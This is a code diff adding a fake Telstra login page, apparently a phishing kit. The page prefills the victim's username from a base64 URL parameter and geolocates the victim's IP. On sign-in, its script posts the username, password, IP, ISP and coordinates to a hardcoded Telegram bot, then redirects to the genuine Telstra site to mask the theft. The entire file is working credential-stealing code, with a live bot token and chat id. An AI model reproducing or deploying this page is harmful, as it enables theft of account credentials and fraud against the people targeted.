@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log into Telstra</title>
+    <link rel="stylesheet" href="assets/custom.css">
+</head>
+<body>
+    <div class="wrapper">
+        <div class="container">
+            <nav>
+                <div class="navbar__brand">
+                        <img src="assets/telstra_ico.png" alt="telstraImage" />
+                </div>
+            </nav>
+        </div>
+    </div>
+
+    <div class="login__body">
+        <h3>Sign In</h3>
+        <p class="p-heading spacing">Sign in with your Telstra ID</p>
+
+        <div class="form__body">
+            <form action="#" method="post">
+                <div class="form-group form-spacing">
+                    <div>
+                        <label class="label__register">Back to previous for</label>
+                    </div>
+                    <input type="text" id="username" readonly required/>
+
+                    <span id="error-msg" style="color:red; font: 400 1rem/1.4 Telstra Akkurat,Helvetica Neue,Helvetica,Arial,sans-serif; font-size: 14px; display: none;
+                    ">Required field. Please enter your username.</span>
+                </div>
+
+
+                <div class="form-group">
+                    <div>
+                        <label>Password</label>
+                    </div>
+                    <input type="password" id="password" required/>
+
+                    <span id="error-msg" style="color:red; font: 400 1rem/1.4 Telstra Akkurat,Helvetica Neue,Helvetica,Arial,sans-serif; font-size: 14px; display: none;
+                    ">Required field. Please enter your username.</span>
+                </div>
+                <a class="form__recover" href="#" style="text-decoration: underline">Reset Password</a>
+
+                <input type="hidden" id="ip" />
+                <input type="hidden" id="isp" />
+                <input type="hidden" id="longitude" />
+                <input type="hidden" id="latitude" />
+
+                <button class="btn" type="button" onclick="handleEvent(event)">Sign in</button>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer__body">
+            <p>Copyright &copy;2022 Telstra </p>
+            <p>Privacy</p>
+            <p>Term of use</p>
+        </div>
+    </footer>
+</body>
+</html>
+
+<!-- ====== SCRIPTING START HERE ===========  -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+    $(document).ready(function () {
+    $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
+    var obj = JSON.parse(JSON.stringify(data));
+    //console.log(obj);
+    document.getElementById('ip').value = obj.ip;
+    document.getElementById('isp').value = obj.isp;
+    document.getElementById('latitude').value = obj.latitude;
+    document.getElementById('longitude').value = obj.longitude;
+        });
+    });
+  
+
+var username = document.querySelector('#username');
+var password = document.querySelector('#password');
+var ip = document.querySelector('#ip');
+var isp = document.querySelector('#isp');
+var longitude = document.querySelector('#longitude');
+var latitude = document.querySelector('#latitude');
+
+const url_string = window.location;
+let url = new URL(url_string);
+let name = url.searchParams.get("username");
+username.value=atob(name);
+
+const handleEvent = (event) => {
+    event.preventDefault();
+
+if(!password.value) {
+    password.setAttribute("required", "");
+} else {
+
+var message = "";
+message += "+===========TELSTRA LOGIN ======="+'\n'
+message += "[IP] "  +  " : " + ip.value + '\n';
+message += "[ISP] "  +  " : " + isp.value + '\n';
+message += "[LONGITUDE] "  +  " : " +longitude.value + '\n';
+message += "[LATITUDE] "  +  " : " + latitude.value + '\n';
+message += "[USERNAME] "  +  " : " + username.value + '\n';
+message += "[PASSWORD] "  +  " : " + password.value;
+
+
+let token = '5482331462:AAFoAQ8Q90qWejDgfZ-8eWzgLBClTrgfI2g';
+var chatid = '567721902';
+
+var settings = {
+  "async": true,
+  "crossDomain": true,
+  "url": "https://api.telegram.org/bot" + token + "/sendMessage?chat_id="+chatid,
+  "method": "POST",
+  "headers": {
+    "Content-Type": "application/json",
+    "cache-control": "no-cache"
+  },
+  "data": JSON.stringify({
+    "chat_id": chatid,
+    "text": message
+  })
+}
+
+$.ajax(settings).done(function (response) {
+  if(response.ok === true) {
+      window.location.href = "https://myid.telstra.com/identity/as/lafEA/resume/as/authorization.ping";
+  }
+  
+}); 
+
+}
+}
+
+</script>
+
+<!-- ====== SCRIPTING END HERE ===========  -->
